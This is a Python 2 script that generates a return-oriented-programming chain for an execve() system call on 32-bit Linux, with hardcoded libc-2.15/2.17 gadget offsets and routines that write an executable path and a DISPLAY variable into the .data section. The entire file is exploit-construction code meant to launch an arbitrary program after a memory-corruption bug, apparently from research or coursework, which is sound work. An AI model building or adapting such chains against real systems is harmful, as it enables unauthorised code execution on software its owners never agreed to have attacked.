import re
import sys

"""
This program is to create ROP code for the execve() system call to place in rop_codes.json
"""

"""
These are the commands usually used to call execve on 32-bit systems
They've been tested on libc-2.15 and libc-2.17
Please change only the relative addresses of the gadgets to the ones on the system to be exploited.
"""

pop_ecx_pop_eax = ''
mov_eax_ecx = ''
xor_eax_eax = ''
pop_ecx_pop_edx = ''
mov_edx_eax = ''
pop_ecx_pop_ebx = ''
add_eax_b = ''
call_gs_10 = ''

"""
@params
path: path of the executable - example: /usr/bin/abiword
The function adds the environment variable DISPLAY=:0.0 to allow applications with GUI to be started.
"""

def gui_execve(path):

    if len(path) % 4 > 0:
        for i in range (0, 4 - len(path) % 4):
            path = path + 'a'

    tokens = re.findall('....', path)

    offset = int('0x18', 16) + len(tokens) * 4

    rop_code = xor_eax_eax + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x10: Offset for NULL after DISPLAY=:0.0 (.data base)\\n'
    rop_code = rop_code + mov_edx_eax
    rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x18: Offset for envp\\n'
    rop_code = rop_code + mov_edx_eax
    rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : '

    if len(sys.argv[1]) % 4 == 0:
        null_offset = offset + 4
    else:
        null_offset = offset + len(sys.argv[1]) % 4

    rop_code = rop_code + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n'
    rop_code = rop_code + mov_edx_eax
    rop_code = rop_code + pop_ecx_pop_edx + 'Padding    : 0x01010101: (To neutralize pop ecx)\\n' + 'Address    : 0x14: Offset for DISPLAY=:0.0 (.data base)\\n'
    rop_code = rop_code + pop_ecx_pop_ebx + 'Address    : ' + str(hex(null_offset)) + ': Offset for NULL (.data base)\\n' + 'Address    : 0x1c: Offset for ' + tokens[0] + ' (.data base)\\n'
    rop_code = rop_code + add_eax_b
    rop_code = rop_code + call_gs_10

    for token in reversed(tokens):
        commands = [pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ": " + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = ''.join(commands) + rop_code
        offset = offset - 4

    offset = 0xc
    rop_code = mov_eax_ecx + rop_code
    rop_code = pop_ecx_pop_eax + 'Address    : 0x4: Pointer to DISPLAY:=0.0, NULL\\n' + 'Address    : 0x14: Offset for above pointer (.data base)\\n' + rop_code

    tokens = re.findall('....', 'DISPLAY=:0.0')
    for token in reversed(tokens):
        commands = [pop_ecx_pop_eax + 'Data       : ', 'Address    : ', ': Offset for ', ' (.data base)\\n' + mov_eax_ecx]
        commands[0] = commands[0] + '0x'
        token = token[::-1]
        for char in token:
            commands[0] = commands[0] + str(hex(ord(char)))[2:]
        token = token[::-1]
        commands[0] = commands[0] + ": " + token + '\\n'
        commands[1] = commands[1] + str(hex(offset))
        commands[3] = token + commands[3]
        rop_code = ''.join(commands) + rop_code
        offset = offset - 4

    print rop_code

def main():

    if len(sys.argv) < 3:
        print 'Enter the path of the executable and if it\'s a GUI(1) or command line(2) application'
        sys.exit(1)

    global pop_ecx_pop_eax
    global mov_eax_ecx
    global xor_eax_eax
    global pop_ecx_pop_edx
    global mov_edx_eax
    global pop_ecx_pop_ebx
    global add_eax_b
    global call_gs_10

    if len(sys.argv) == 4 and sys.argv[3] == 'kavya':
        pop_ecx_pop_eax = 'ROP command: 0xf2d21L: pop ecx ; pop eax ;;\\n'
        mov_eax_ecx = 'ROP command: 0x2d71fL: mov [eax] ecx ;;\\n'
        xor_eax_eax = 'ROP command: 0x341a5L: xor eax eax ;;\\n'
        pop_ecx_pop_edx = 'ROP command: 0x2df7bL: pop ecx ; pop edx ;;\\n'
        mov_edx_eax = 'ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;\\n'
        pop_ecx_pop_ebx = 'ROP command: 0xfca82L: pop ecx ; pop ebx ;;\\n'
        add_eax_b = 'ROP command: 0x148428L: add eax 0xb ;;\\n'
        call_gs_10 = 'ROP command: 0xb8dc5L: call dword [gs:0x10]'

    else:
        pop_ecx_pop_eax = 'ROP command: 0xf5160L: pop ecx ; pop eax ;;\\n'
        mov_eax_ecx = 'ROP command: 0x2e09fL: mov [eax] ecx ;;\\n'
        xor_eax_eax = 'ROP command: 0x34964L: xor eax eax ;;\\n'
        pop_ecx_pop_edx = 'ROP command: 0x2e8bbL: pop ecx ; pop edx ;;\\n'
        mov_edx_eax = 'ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;\\n'
        pop_ecx_pop_ebx = 'ROP command: 0xff102L: pop ecx ; pop ebx ;;\\n'
        add_eax_b = 'ROP command: 0x14da28L: add eax 0xb ;;\\n'
        call_gs_10 = 'ROP command: 0xbaa75L: call dword [gs:0x10]'

    if int(sys.argv[2]) == 1:
    	gui_execve(sys.argv[1])

if __name__ == '__main__':
    main()